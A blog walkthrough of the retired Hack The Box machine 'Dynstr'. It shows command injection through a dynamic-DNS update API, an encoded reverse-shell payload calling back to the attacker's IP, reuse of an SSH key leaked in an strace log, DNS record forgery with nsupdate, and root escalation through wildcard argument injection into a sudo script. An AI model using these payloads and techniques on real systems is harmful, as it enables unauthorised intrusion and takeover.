---
layout: single
title: "Walktrough: HTB Dynstr"
namespace: htb-dynstr
category: Walkthrough
tags:
  - HackTheBox
  - HTB Medium
  - HTB Linux
date: 2021-10-16 16:00:00
header:
  teaser: https://i.imgur.com/89b1SdH.png
  og_image: https://i.imgur.com/89b1SdH.png
---

Hello guys!

This week's machine will be **Dynstr**, another medium-rated Linux box from [Hack The Box](https://www.hackthebox.eu/), created by [jkr](https://app.hackthebox.eu/users/77141).<!--more-->

:information_source: **Info**: Write-ups for Hack The Box machines are posted as soon as they’re retired.
{: .notice--info}

![HTB Dynstr](https://i.imgur.com/kqW8fwk.png){: .align-center}

Had the opportunity to learn a lot with this box. First while playing with some code injection dictionaries, and later understanding the `nsupdate` utility. After getting the code execution and reverse shell, found an RSA private key to be used with SSH, but had to overcome some restrictions on the `authorized_keys` file to get another user account. Finally, to get `root`, played with globbing to get an escalation opportunity on the box.

I hope you guys enjoy it!

## Enumeration

As usual, started enumerating published services using a `nmap` quick scan.

```bash
$ nmap -sC -sV -Pn -oA quick 10.10.10.244
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-11 18:32 -03
Nmap scan report for 10.10.10.244
Host is up (0.072s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 05:7c:5e:b1:83:f9:4f:ae:2f:08:e1:33:ff:f5:83:9e (RSA)
|   256 3f:73:b4:95:72:ca:5e:33:f6:8a:8f:46:cf:43:35:b9 (ECDSA)
|_  256 cc:0a:41:b7:a1:9a:43:da:1b:68:f5:2a:f8:2a:75:2c (ED25519)
53/tcp open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.16.1-Ubuntu
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Dyna DNS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.02 seconds
```

Checking the initial scan output we can see a DNS Service, as well as an HTTP website published. Before looking into the DNS Service, let's see which kind of information the website can give us.

### 80/TCP - HTTP Service

Accessing the webpage, as mentioned in the title, talks about a Dyna DNS company, a company like [No-IP](https://no-ip.com) which allows you to register a DNS entry and dynamically update it, making it easier to access your resources when you don't own a static IP address.

![HTB Dynstr - Dyna DNS](https://i.imgur.com/gtdmYDI.jpg){: .align-center}

Besides a single-page application, this website contains especially useful information in the section *Our Services*, that will be valuable to us during this box resolution, as well as the domain `dynadns.htb`, used in the e-mail address in the footer:

![HTB Dynstr - Dyna DNS Services](https://i.imgur.com/QZvDDXJ.png){: .align-center}

- Application for DNS registration uses the same API as `no-ip.com`, as available in their documentation at [Integrate with No-IP DDNS - API Information (noip.com)](https://www.noip.com/integrate/request).
- The domains that could be used for this service are listed, which were later added to the local hosts file.
- Demo credentials were provided, so we can start playing with the API :smile:

#### Interacting with the API

According to No-IP documentation, the API can be found at `/nic/update` and requires Basic authentication, where a GET request containing the IP and the hostname to be updated is the main feature of this API, as the example below:

```bash
$ echo -n 'dynadns:sndanyd' | base64
ZHluYWRuczpzbmRhbnlk
$ curl -i -s -k -H $'Authorization: Basic ZHluYWRuczpzbmRhbnlk' "http://10.10.10.244/nic/update?myip=10.10.10.10&hostname=myhostname.no-ip.htb" -v
*   Trying 10.10.10.244:80...
* Connected to 10.10.10.244 (10.10.10.244) port 80 (#0)
> GET /nic/update?myip=10.10.10.10&hostname=myhostname.no-ip.htb HTTP/1.1
> Host: 10.10.10.244
> User-Agent: curl/7.74.0
> Accept: */*
> Authorization: Basic ZHluYWRuczpzbmRhbnlk
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
HTTP/1.1 200 OK
< Date: Fri, 13 Aug 2021 21:36:36 GMT
Date: Fri, 13 Aug 2021 21:36:36 GMT
< Server: Apache/2.4.41 (Ubuntu)
Server: Apache/2.4.41 (Ubuntu)
< Content-Length: 18
Content-Length: 18
< Content-Type: text/html; charset=UTF-8
Content-Type: text/html; charset=UTF-8

<
good 10.10.10.10
* Connection #0 to host 10.10.10.244 left intact
```

Playing a little with the API started receiving some **wrngdom** errors when some of the supported domains are not present, like below:

```bash
$ curl -i -s -k -H $'Authorization: Basic ZHluYWRuczpzbmRhbnlk' "http://10.10.10.244/nic/update?myip=10.10.10.10&hostname=;pwd" -v
*   Trying 10.10.10.244:80...
* Connected to 10.10.10.244 (10.10.10.244) port 80 (#0)
> GET /nic/update?myip=10.10.10.10&hostname=;pwd HTTP/1.1
> Host: 10.10.10.244
> User-Agent: curl/7.74.0
> Accept: */*
> Authorization: Basic ZHluYWRuczpzbmRhbnlk
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
HTTP/1.1 200 OK
< Date: Fri, 13 Aug 2021 21:38:23 GMT
Date: Fri, 13 Aug 2021 21:38:23 GMT
< Server: Apache/2.4.41 (Ubuntu)
Server: Apache/2.4.41 (Ubuntu)
< Content-Length: 16
Content-Length: 16
< Content-Type: text/html; charset=UTF-8
Content-Type: text/html; charset=UTF-8

<
911 [wrngdom: ]
* Connection #0 to host 10.10.10.244 left intact
```

So, to check for injections started to fuzz using a simple `while` loop for contents of wordlist `/usr/share/wordlists/wfuzz/Injections/All_attack.txt`, until getting the error below:

```bash
$ while read p; do
while> curl -i -s -k -H $'Authorization: Basic ZHluYWRuczpzbmRhbnlk' "http://10.10.10.244/nic/update?myip=10.10.10.10&hostname==$p.no-ip.htb" -v
while> done < /usr/share/wordlists/wfuzz/Injections/All_attack.txt

[...]
* Connection #0 to host 10.10.10.244 left intact
*   Trying 10.10.10.244:80...
* Connected to 10.10.10.244 (10.10.10.244) port 80 (#0)
> GET /nic/update?myip=10.10.10.10&hostname=-1.no-ip.htb HTTP/1.1
> Host: 10.10.10.244
> User-Agent: curl/7.74.0
> Accept: */*
> Authorization: Basic ZHluYWRuczpzbmRhbnlk
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
HTTP/1.1 200 OK
< Date: Fri, 13 Aug 2021 21:30:11 GMT
Date: Fri, 13 Aug 2021 21:30:11 GMT
< Server: Apache/2.4.41 (Ubuntu)
Server: Apache/2.4.41 (Ubuntu)
< Content-Length: 22
Content-Length: 22
< Content-Type: text/html; charset=UTF-8
Content-Type: text/html; charset=UTF-8

<
911 [nsupdate failed]
```

As it mentions that `nsupdate` has failed with the payload sent (in this case `-1.no-ip.htb`) this means that the API triggers this binary in a non-interactive way. Doing some research, I have found on this page [Using the dynamic DNS editor, nsupdate (rtfm-sarl.ch)](https://www.rtfm-sarl.ch/articles/using-nsupdate.html) some examples of usage that could be hijacked to get code execution in the backend, once it accepts standard input, which might be the way used in the automation that updates DNS entries in the zones.

To prove if this is correct, I made a simple test, encapsulating the commands I wanted to be executed in `$()`, and checked the DNS entry using `dig`, which returned success.

![HTB Dynstr - OS Code injection payload](https://i.imgur.com/r5qrIOo.png){: .align-center}

```bash
$ dig @10.10.10.244 mytestsubdomain.no-ip.htb

; <<>> DiG 9.16.15-Debian <<>> @10.10.10.244 mytestsubdomain.no-ip.htb
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 20816
;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: c46a9e70a58d51c501000000611a665bf50e119ef07ea985 (good)
;; QUESTION SECTION:
;mytestsubdomain.no-ip.htb.     IN      A

;; ANSWER SECTION:
mytestsubdomain.no-ip.htb. 30   IN      A       10.10.10.11

;; Query time: 68 msec
;; SERVER: 10.10.10.244#53(10.10.10.244)
;; WHEN: Mon Aug 16 10:21:33 -03 2021
;; MSG SIZE  rcvd: 98
```

Now that we have confirmed that we can get code execution this way, modified the request to start a reverse shell using a base64 encoded payload, avoiding encoding issues

```http
GET /nic/update?myip=10.10.10.11&hostname=%24%28%65%63%68%6f%20%63%6d%30%67%4c%33%52%74%63%43%39%6d%4f%32%31%72%5a%6d%6c%6d%62%79%41%76%64%47%31%77%4c%32%59%37%59%32%46%30%49%43%39%30%62%58%41%76%5a%6e%77%76%59%6d%6c%75%4c%33%4e%6f%49%43%31%70%49%44%49%2b%4a%6a%46%38%62%6d%4d%67%4d%54%41%75%4d%54%41%75%4d%54%51%75%4d%54%49%78%49%44%51%30%4e%44%4d%67%50%69%39%30%62%58%41%76%5a%67%3d%3d%20%7c%20%62%61%73%65%36%34%20%2d%64%20%7c%20%62%61%73%68%29.no-ip.htb HTTP/1.1
Host: 10.10.10.244
User-Agent: python-requests/2.25.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Authorization: Basic ZHluYWRuczpzbmRhbnlk
```

## User flag

Started enumeration using the obtained account `www-data`, default for apache, using `linpeas.sh`, where the following items were identified:

- Users with console and their permissions:

```plaintext
uid=0(root) gid=0(root) groups=0(root)
uid=1000(dyna) gid=1000(dyna) groups=1000(dyna),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare)
uid=1001(bindmgr) gid=1001(bindmgr) groups=1001(bindmgr)
```

- Ability to list files inside others home directories, where we can see some SSH Keys for `bindmgr` account

```plaintext
╔══════════╣ Files inside others home (limit 20)                                                                             /home/bindmgr/support-case-C62796521/strace-C62796521.txt
/home/bindmgr/support-case-C62796521/C62796521-debugging.script
/home/bindmgr/support-case-C62796521/C62796521-debugging.timing
/home/bindmgr/support-case-C62796521/command-output-C62796521.txt
/home/bindmgr/user.txt
/home/bindmgr/.ssh/known_hosts
/home/bindmgr/.ssh/id_rsa.pub
/home/bindmgr/.ssh/authorized_keys
/home/bindmgr/.ssh/id_rsa
/home/bindmgr/.bashrc
/home/bindmgr/.bash_logout
/home/bindmgr/.profile
/home/dyna/.bashrc
/home/dyna/.bash_logout
/home/dyna/.profile
/home/dyna/.sudo_as_admin_successful
```

  Checking the contents of `/home/bindmgr`, we can see the `user.txt` file but we have no read rights on it. In this user's profile, there's also a folder called `support-case-C62796521`, which contains some debugging/tracing output from some tasks executed in the server.

```bash
www-data@dynstr:/var/www$ ls -la /home/bindmgr/
total 36
drwxr-xr-x 5 bindmgr bindmgr 4096 Mar 15 20:39 .
drwxr-xr-x 4 root    root    4096 Mar 15 20:26 ..
lrwxrwxrwx 1 bindmgr bindmgr    9 Mar 15 20:29 .bash_history -> /dev/null
-rw-r--r-- 1 bindmgr bindmgr  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 bindmgr bindmgr 3771 Feb 25  2020 .bashrc
drwx------ 2 bindmgr bindmgr 4096 Mar 13 12:09 .cache
-rw-r--r-- 1 bindmgr bindmgr  807 Feb 25  2020 .profile
drwxr-xr-x 2 bindmgr bindmgr 4096 Mar 13 12:09 .ssh
drwxr-xr-x 2 bindmgr bindmgr 4096 Mar 13 14:53 support-case-C62796521
-r-------- 1 bindmgr bindmgr   33 Aug 16 15:49 user.txt
www-data@dynstr:/var/www$
```

  After analyzing the files, noticed that in `strace-C62796521.txt` we have the private key in plain text, which was extracted and saved as an `id_rsa` file.

```plaintext
[...]
15123 read(5, "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEAxeKZHOy+RGhs+gnMEgsdQas7klAb37HhVANJgY7EoewTwmSCcsl1\n42kuvUhxLultlMRCj1pnZY/1sJqTywPGalR7VXo+2l0Dwx3zx7kQFiPeQJwiOM8u/g8lV3\nHjGnCvzI4UojALjCH3YPVuvuhF0yIPvJDessdot/D2VPJqS+TD/4NogynFeUrpIW5DSP+F\nL6oXil+sOM5ziRJQl/gKCWWDtUHHYwcsJpXotHxr5PibU8EgaKD6/heZXsD3Gn1VysNZdn\nUOLzjapbDdRHKRJDftvJ3ZXJYL5vtupoZuzTTD1VrOMng13Q5T90kndcpyhCQ50IW4XNbX\nCUjxJ+1jgwAAA8g3MHb+NzB2/gAAAAdzc2gtcnNhAAABAQDF4pkc7L5EaGz6CcwSCx1Bqz\nuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7a\nXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38P\nZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk\n+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs\n4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WODAAAAAwEAAQAAAQEAmg1KPaZgiUjybcVq\nxTE52YHAoqsSyBbm4Eye0OmgUp5C07cDhvEngZ7E8D6RPoAi+wm+93Ldw8dK8e2k2QtbUD\nPswCKnA8AdyaxruDRuPY422/2w9qD0aHzKCUV0E4VeltSVY54bn0BiIW1whda1ZSTDM31k\nobFz6J8CZidCcUmLuOmnNwZI4A0Va0g9kO54leWkhnbZGYshBhLx1LMixw5Oc3adx3Aj2l\nu291/oBdcnXeaqhiOo5sQ/4wM1h8NQliFRXraymkOV7qkNPPPMPknIAVMQ3KHCJBM0XqtS\nTbCX2irUtaW+Ca6ky54TIyaWNIwZNznoMeLpINn7nUXbgQAAAIB+QqeQO7A3KHtYtTtr6A\nTyk6sAVDCvrVoIhwdAHMXV6cB/Rxu7mPXs8mbCIyiLYveMD3KT7ccMVWnnzMmcpo2vceuE\nBNS+0zkLxL7+vWkdWp/A4EWQgI0gyVh5xWIS0ETBAhwz6RUW5cVkIq6huPqrLhSAkz+dMv\nC79o7j32R2KQAAAIEA8QK44BP50YoWVVmfjvDrdxIRqbnnSNFilg30KAd1iPSaEG/XQZyX\nWv//+lBBeJ9YHlHLczZgfxR6mp4us5BXBUo3Q7bv/djJhcsnWnQA9y9I3V9jyHniK4KvDt\nU96sHx5/UyZSKSPIZ8sjXtuPZUyppMJVynbN/qFWEDNAxholEAAACBANIxP6oCTAg2yYiZ\nb6Vity5Y2kSwcNgNV/E5bVE1i48E7vzYkW7iZ8/5Xm3xyykIQVkJMef6mveI972qx3z8m5\nrlfhko8zl6OtNtayoxUbQJvKKaTmLvfpho2PyE4E34BN+OBAIOvfRxnt2x2SjtW3ojCJoG\njGPLYph+aOFCJ3+TAAAADWJpbmRtZ3JAbm9tZW4BAgMEBQ==\n-----END OPENSSH PRIVATE KEY-----\n", 4096) = 1823
[...]
```

When I tried to SSH to bindmgr account using this key, noticed that it failed. Checking the contents of `authorized_keys` file, verified that we have a `from` option defined, that will prevent us from accessing the account using that key if not registered as a `*.infra.dyna.htb` subdomain.

```bash
www-data@dynstr:/tmp$ cat /home/bindmgr/.ssh/authorized_keys
from="*.infra.dyna.htb" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDF4pkc7L5EaGz6CcwSCx1BqzuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7aXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38PZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WOD bindmgr@nomen
```

To achieve that, we would need to edit the hosts file, not possible with current credentials, but we could also leverage `nsupdate` to include our DNS entry into the `infra.dyna.htb` zone, where I've captured the command used in the API to be reused in our scenario:

```php
// Update DNS entry
$cmd = sprintf("server 127.0.0.1\nzone %s\nupdate delete %s.%s\nupdate add %s.%s 30 IN A %s\nsend\n",$d,$h,$d,$h,$d,$myip);
system('echo "'.$cmd.'" | /usr/bin/nsupdate -t 1 -k /etc/bind/ddns.key',$retval);
```

Based on that, crafted the following command line to add our IP as a known subdomain

```bash
www-data@dynstr:/dev/shm$ cat nsupdate
server 127.0.0.1
zone dyna.htb
update delete attacker.infra.dyna.htb
update add attacker.infra.dyna.htb 30 IN A 10.10.10.10
send
www-data@dynstr:/dev/shm$ cat nsupdate | /usr/bin/nsupdate -t 1 -k /etc/bind/ddns.key
update failed: REFUSED
```

After some research, found that this REFUSED error could be due to the key used and, checking the directory where the `ddns.key` was located, found 2 other files (as below), where the include using the file `infra.key` worked successfully **BUT** I still wasn't able to connect using SSH.

```bash
www-data@dynstr:/dev/shm$ ls -la /etc/bind/*.key
-rw-r--r-- 1 root bind 100 Mar 15 20:44 /etc/bind/ddns.key
-rw-r--r-- 1 root bind 101 Mar 15 20:44 /etc/bind/infra.key
-rw-r----- 1 bind bind 100 Mar 15 20:14 /etc/bind/rndc.key
```

Doing some troubleshooting, noticed that I was able to solve the `attacker.infra.dyna.htb` but the reverse lookup of the IP address wasn't possible. To fix this, I have added another entry in the `nsupdate` command to also include a PTR record to the IP as below. A crucial point I also had to troubleshoot was that the A and PTR records **must be separated by a blank line**, otherwise the update would fail.

```bash
www-data@dynstr:/dev/shm$ cat nsupdate
server 127.0.0.1
update add attacker.infra.dyna.htb 30 A 10.10.10.10
send

update add 121.14.10.10.in-addr.arpa 30 PTR attacker.infra.dyna.htb
send
www-data@dynstr:/dev/shm$ cat nsupdate | /usr/bin/nsupdate -t 1 -k /etc/bind/infra.key
www-data@dynstr:/dev/shm$
```

After that adjustment, I was able to SSH as `bindmgr` and read the content of `user.txt` file

```bash
bindmgr@dynstr:~$ ls -la
total 36
drwxr-xr-x 5 bindmgr bindmgr 4096 Mar 15 20:39 .
drwxr-xr-x 4 root    root    4096 Mar 15 20:26 ..
lrwxrwxrwx 1 bindmgr bindmgr    9 Mar 15 20:29 .bash_history -> /dev/null
-rw-r--r-- 1 bindmgr bindmgr  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 bindmgr bindmgr 3771 Feb 25  2020 .bashrc
drwx------ 2 bindmgr bindmgr 4096 Mar 13 12:09 .cache
-rw-r--r-- 1 bindmgr bindmgr  807 Feb 25  2020 .profile
drwxr-xr-x 2 bindmgr bindmgr 4096 Mar 13 12:09 .ssh
drwxr-xr-x 2 bindmgr bindmgr 4096 Mar 13 14:53 support-case-C62796521
-r-------- 1 bindmgr bindmgr   33 Aug 16 15:49 user.txt
bindmgr@dynstr:~$ cat use
cat: use: No such file or directory
bindmgr@dynstr:~$ cat user.txt
<redacted>
```

## Root flag

As always, started with a `sudo -l` command, where I found that the `bindmgr` user is capable to run the script below as root:

```bash
bindmgr@dynstr:~$ sudo -l
sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
Matching Defaults entries for bindmgr on dynstr:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User bindmgr may run the following commands on dynstr:
    (ALL) NOPASSWD: /usr/local/bin/bindmgr.sh
bindmgr@dynstr:~
```

Checking its content, noticed one interesting entry in **line 42**, where the script, running as `root`, copies the file `.version` and all other existing files in the current directory (`*`) to $BINDMGR_DIR. Also, it requires a `.version` file in the current directory to be compared with the existing configuration in the server.

```bash
# Stage new version of configuration files.
echo "[+] Staging files to $BINDMGR_DIR."
cp .version * /etc/bind/named.bindmgr/
```

After the first execution, noticed that `.version` was copied with `root` permissions, allowing us to abuse a SUID binary this way.

```bash
bindmgr@dynstr:/tmp/tmp.UzxayH3IIl$ sudo /usr/local/bin/bindmgr.sh
sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
[+] Running /usr/local/bin/bindmgr.sh to stage new configuration from /tmp/tmp.UzxayH3IIl.
[+] Creating /etc/bind/named.conf.bindmgr file.
[+] Staging files to /etc/bind/named.bindmgr.
cp: cannot stat '*': No such file or directory
[+] Checking staged configuration.
[-] ERROR: The generated configuration is not valid. Please fix following errors:
    /etc/bind/named.conf.bindmgr:2: open: /etc/bind/named.bindmgr/*: file not found
bindmgr@dynstr:/tmp/tmp.UzxayH3IIl$ ls -la /etc/bind/named.bindmgr/
total 12
drwxr-sr-x 2 root bind 4096 Aug 16 18:22 .
drwxr-sr-x 3 root bind 4096 Aug 16 18:22 ..
-rw-r--r-- 1 root bind    2 Aug 16 18:22 .version
```

Checking the [cp \| GTFOBins](https://gtfobins.github.io/gtfobins/cp/#suid) for SUID, noticed that if `cp` has SUID it could be used to copy contents from restricted file systems but, as it is not the case, we would need another way to abuse the use of `cp` in this script.

One point seen in the page mentioned above is that we could use the parameter `--preserve` to **preserve file attributes** during the copy. Appending this parameter to execution could be achieved thanks to a `bash` feature called **filename expansion**, popularly known as ***[globbing](https://tldp.org/LDP/abs/html/globbingref.html)*** which **expands** the names of the files during command execution.  This behavior can be seen in the example below with `echo`:

```bash
bindmgr@dynstr:/tmp/tmp.PdP9Qf49qx$ ls -l
total 0
-rw-rw-r-- 1 bindmgr bindmgr 0 Aug 16 19:15 file.sh
-rw-rw-r-- 1 bindmgr bindmgr 0 Aug 16 19:15 test.txt
bindmgr@dynstr:/tmp/tmp.PdP9Qf49qx$ echo *
file.sh test.txt
```

This could be exploited as we could also abuse that during `cp` execution, copying a previously SUID configured file, allowing us to escalate privileges.

This was achieved by running the steps below:

- Copied `/bin/bash` to a working temp directory and changed its permissions, setting its SUID bit and creating the `.version` file.

```bash
bindmgr@dynstr:/tmp$ cd $(mktemp -d)
bindmgr@dynstr:/tmp/tmp.7i6oryDsae$ cp /bin/bash .
bindmgr@dynstr:/tmp/tmp.7i6oryDsae$ chmod u+s bash
bindmgr@dynstr:/tmp/tmp.7i6oryDsae$ echo 1 > .version
bindmgr@dynstr:/tmp/tmp.7i6oryDsae$ ls -la
total 1168
drwx------  2 bindmgr bindmgr    4096 Aug 16 19:22 .
drwxrwxrwt 13 root    root       4096 Aug 16 19:22 ..
-rwsr-xr-x  1 bindmgr bindmgr 1183448 Aug 16 19:22 bash
-rw-rw-r--  1 bindmgr bindmgr       2 Aug 16 19:22 .version
```

- Created a file called `--preserve=mode`, so its name could be expanded as a parameter for `cp` during script execution, copying `bash` as root but keeping SUID set. We can confirm that as well using `echo`, also below

```bash
bindmgr@dynstr:/tmp/tmp.7i6oryDsae$ echo "" > ./--preserve=mode
bindmgr@dynstr:/tmp/tmp.7i6oryDsae$ echo *
bash --preserve=mode
```

- Ran the script using `sudo`

```bash
bindmgr@dynstr:/tmp/tmp.7i6oryDsae$ sudo /usr/local/bin/bindmgr.sh
sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
[+] Running /usr/local/bin/bindmgr.sh to stage new configuration from /tmp/tmp.7i6oryDsae.
[+] Creating /etc/bind/named.conf.bindmgr file.
[+] Staging files to /etc/bind/named.bindmgr.
[+] Checking staged configuration.
[-] ERROR: The generated configuration is not valid. Please fix following errors:
    /etc/bind/named.bindmgr/bash:1: unknown option 'ELF...'
    /etc/bind/named.bindmgr/bash:14: unknown option 'hȀE'
    /etc/bind/named.bindmgr/bash:40: unknown option 'YF'
    /etc/bind/named.bindmgr/bash:40: unexpected token near '}'
```

- Executed the `bash` binary with `-p` parameter, as stated in [bash \| GTFOBins](https://gtfobins.github.io/gtfobins/bash/#suid), giving me an interactive shell as `root` and able to read contents of `/root/root.txt` file :smiley:

```bash
bindmgr@dynstr:/tmp/tmp.7i6oryDsae$ /etc/bind/named.bindmgr/bash -p
bash-5.0# ls -la
total 1172
drwx------  2 bindmgr bindmgr    4096 Aug 16 19:10  .
drwxrwxrwt 13 root    root       4096 Aug 16 19:09  ..
-rwsr-xr-x  1 bindmgr bindmgr 1183448 Aug 16 19:10  bash
-rw-rw-r--  1 bindmgr bindmgr       1 Aug 16 19:10 '--preserve=mode'
-rw-rw-r--  1 bindmgr bindmgr       2 Aug 16 19:10  .version
bash-5.0# cd /root
bash-5.0# cat root.txt
<redacted>
```

I hope you guys have enjoyed it!

See you at the next post :smile:
